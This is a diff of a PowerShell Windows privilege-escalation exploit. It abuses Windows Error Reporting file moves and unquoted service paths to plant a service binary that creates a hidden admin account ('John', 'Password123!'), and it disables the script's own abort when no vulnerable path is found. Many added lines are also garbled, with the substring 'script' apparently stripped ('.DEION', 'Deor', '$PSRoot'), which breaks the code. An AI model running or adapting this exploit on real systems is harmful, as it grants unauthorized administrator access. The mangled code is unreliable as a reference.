@@ -1,8 +1,5 @@
-﻿$TempReportDir = "$env:SystemRoot\Temp\RQ"
-$Abusable = Get-ServiceUnquoted
-$find_wer = Get-ChildItem $env:programdata\Microsoft\Windows\WER -Recurse -Filter *.wer -ErrorAction SilentlyContinue | Select-Object -First 1
-
 function Main{
+$find_wer = Get-ChildItem $env:programdata\Microsoft\Windows\WER -Recurse -Filter *.wer -ErrorAction SilentlyContinue | Select-Object -First 1
 clear
 if ($find_wer -eq $null) {
     write-host "no wer files found, do you wish to attempt to create one? WARNING: INTERNET CONNECTION WILL BE RESTARTED!"
@@ -20,11 +17,12 @@ if ($find_wer -eq $null) {
 
 function MakeWer{
 
-        ipconfig /release
+        ipconfig /release | Out-Null
         Start-Process -NoNewWindow powershell.exe "-Command `"[Environment]::FailFast('Error')`""
-        sleep 10
-        ipconfig /renew
+        Write-Host "Trying to force a crash to generate .wer file"
+        sleep 20
         $find_wer = Get-ChildItem $env:programdata\Microsoft\Windows\WER -Recurse -Filter *.wer -ErrorAction SilentlyContinue | Select-Object -First 1
+        ipconfig /renew | Out-Null
         Main
 
 }
@@ -39,7 +37,7 @@ function Write-ServiceBinary {
         Author: @harmj0y
         License: BSD 3-Clause
 
-    .DESCRIPTION
+    .DEION
 
         Takes a pre-compiled C# service binary and patches in the appropriate commands needed
         for service abuse. If a -UserName/-Password or -Credential is specified, the command
@@ -201,11 +199,12 @@ function Write-ServiceBinary {
 
 function Invoke-MoveFileUsingWER($Source, $Destination) {
     Write-Host "Setting up dirs, files & dependencies..."
+    $TempReportDir = "$env:SystemRoot\Temp\RQ"
     Write-Host "[*] Installing NTObjectManager..."
     install-module NTObjectManager -Scope CurrentUser -Force -SkipPublisherCheck
     import-module NTObjectManager
     New-Item -Type Directory -Path $TempReportDir -Force | Out-Null
-    Get-WerFile
+    $find_wer = Get-ChildItem $env:programdata\Microsoft\Windows\WER -Recurse -Filter *.wer -ErrorAction SilentlyContinue | Select-Object -First 1
     Copy-Item $find_wer.FullName "$TempReportDir\Report.wer" -ErrorAction Stop
     Copy-Item $find_wer.FullName "$TempReportDir\Report.wer.tmp" -ErrorAction Stop
 
@@ -257,12 +256,13 @@ function Test-IsFileWritable($Path) {
     }
     return $result
 }
-function Test-Exploit($TargetFile) {
+function Test-Exploit {
+    $Abusable = Get-ServiceUnquoted
 
     if ($Abusable.Count -eq 0){
         Write-Host -ForegroundColor Red $Abusable.Count vulnerable paths found. Machine is not vulnerable. Aborting.
         pause
-        return
+        #return
     }
     else{
         Write-Host -ForegroundColor Green $Abusable.Count vulnerable paths found. Machine is vulnerable 1/2
@@ -301,7 +301,7 @@ function Get-ModifiablePath {
         Author: @harmj0y
         License: BSD 3-Clause
 
-    .DESCRIPTION
+    .DEION
 
         Takes a complex path specification of an initial file/folder path with possible
         configuration files, 'tokenizes' the string in a number of possible ways, and
@@ -354,7 +354,7 @@ function Get-ModifiablePath {
         # # false positives ?
         # $Excludes = @("MsMpEng.exe", "NisSrv.exe")
 
-        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
+        # from http://stackoverflow.com/questions/28029872/retrieving-security-deor-and-getting-number-for-filesystemrights
         $AccessMask = @{
             [uint32]'0x80000000' = 'GenericRead'
             [uint32]'0x40000000' = 'GenericWrite'
@@ -496,12 +496,12 @@ function Add-ServiceDacl {
         Author: Matthew Graeber (@mattifestation)
         License: BSD 3-Clause
 
-    .DESCRIPTION
+    .DEION
 
         Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
         Dacl field to each object. It does this by opening a handle with ReadControl for the
         service with using the GetServiceHandle Win32 API call and then uses
-        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
+        QueryServiceObjectSecurity to retrieve a copy of the security deor for the service.
 
     .PARAMETER Name
 
@@ -543,7 +543,7 @@ function Add-ServiceDacl {
             param (
                 [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                 [ValidateNotNullOrEmpty()]
-                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
+                [Validate({ $_ -as 'ServiceProcess.ServiceController' })]
                 $Service
             )
 
@@ -578,16 +578,16 @@ function Add-ServiceDacl {
 
                 # 122 == The data area passed to a system call is too small
                 if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
-                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)
+                    $BinarySecurityDeor = New-Object Byte[]($SizeNeeded)
 
-                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDeor, $BinarySecurityDeor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                     if (-not $Result) {
                         Write-Error ([ComponentModel.Win32Exception] $LastError)
                     }
                     else {
-                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
-                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
+                        $RawSecurityDeor = New-Object Security.AccessControl.RawSecurityDeor -ArgumentList $BinarySecurityDeor, 0
+                        $Dacl = $RawSecurityDeor.DiscretionaryAcl | ForEach-Object {
                             Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                         }
 
@@ -612,7 +612,7 @@ function Set-ServiceBinPath {
         Author: @harmj0y, Matthew Graeber (@mattifestation)
         License: BSD 3-Clause
 
-    .DESCRIPTION
+    .DEION
 
         Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
         service handle to the service with ConfigControl access using the GetServiceHandle
@@ -622,7 +622,7 @@ function Set-ServiceBinPath {
         Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
         Dacl field to each object. It does this by opening a handle with ReadControl for the
         service with using the GetServiceHandle Win32 API call and then uses
-        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
+        QueryServiceObjectSecurity to retrieve a copy of the security deor for the service.
 
     .PARAMETER Name
 
@@ -729,7 +729,7 @@ function Test-ServiceDaclPermission {
         Author: @harmj0y, Matthew Graeber (@mattifestation)
         License: BSD 3-Clause
 
-    .DESCRIPTION
+    .DEION
 
         Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
         a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
@@ -942,7 +942,7 @@ function Get-ServiceUnquoted {
 
 #Exploit Privesc
 function Exploit {
-cd $PSScriptRoot
+cd $PSRoot
 Write-ServiceBinary -Name service -ErrorAction SilentlyContinue
 
     if($TargetFile -eq $null) {
@@ -952,13 +952,13 @@ Write-ServiceBinary -Name service -ErrorAction SilentlyContinue
         Write-Warning "Target file already exists"
         return
     }
-    cp "$PSScriptRoot\service.exe" "$env:SystemRoot\Temp\testfile" -ErrorAction Stop | Out-Null
+    cp "$PSRoot\service.exe" "$env:SystemRoot\Temp\testfile" -ErrorAction Stop | Out-Null
     Invoke-MoveFileUsingWER -Source "$env:SystemRoot\Temp\testfile" -Destination $TargetFile
 
     if (Test-IsFileWritable($TargetFile)) {
         Write-Host -ForegroundColor Green "File $TargetFile successfully created!"
         Write-Host "Restart your computer to create a new admin account named John with creds Password123!"
-        Remove-Item "$PSScriptRoot\service.exe" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$PSRoot\service.exe" -Force -ErrorAction SilentlyContinue
         #Get-Item $TargetFile
     } else {
         Write-Warning "File not created or not writable."
